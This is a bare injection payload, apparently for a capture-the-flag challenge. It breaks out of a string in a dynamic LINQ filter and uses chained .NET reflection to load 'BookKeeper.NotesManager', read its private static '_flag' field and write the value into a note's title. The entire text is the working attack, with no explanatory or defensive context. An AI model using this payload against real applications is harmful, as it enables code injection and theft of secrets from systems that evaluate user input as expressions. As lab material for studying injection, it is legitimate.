") and true && it.GetType().Assembly.DefinedTypes.Where(t=>t.FullName=="Reflective.Note").First().DeclaredMethods.Where(m=>m.Name=="set_Title").First().Invoke(
 it,
 new System.Object[]{
   (
     ("").GetType().Assembly
       .DefinedTypes.Where(t=>t.FullName=="System.Reflection.Assembly").First()
       .DeclaredMethods.Where(m=>m.Name=="CreateInstance").First()
       .Invoke(
         ("").GetType().Assembly
           .DefinedTypes.Where(t=>t.FullName=="System.Array").First()
           .DeclaredMethods.Where(m=>m.Name=="GetValue").First()
           .Invoke(
             ("").GetType().Assembly
               .DefinedTypes.Where(t=>t.FullName=="System.AppDomain").First()
               .DeclaredMethods.Where(m=>m.Name=="GetAssemblies").First()
               .Invoke(
                 ("").GetType().Assembly
                   .DefinedTypes.Where(t=>t.FullName=="System.AppDomain").First()
                   .DeclaredProperties.Where(p=>p.Name=="CurrentDomain").First()
                   .GetValue(null),
                 new System.Object[]{}
               ),
             new System.Object[]{ new [] { 97 } }
           ),
         new System.Object[]{ "BookKeeper.NotesManager" }
       )
   ).GetType().Assembly
     .DefinedTypes.Where(tt=>tt.Name=="NotesManager").First()
     .DeclaredFields.Where(f=>f.Name=="_flag").First()
     .GetValue(null).ToString()
 }
)==null and Title.StartsWith("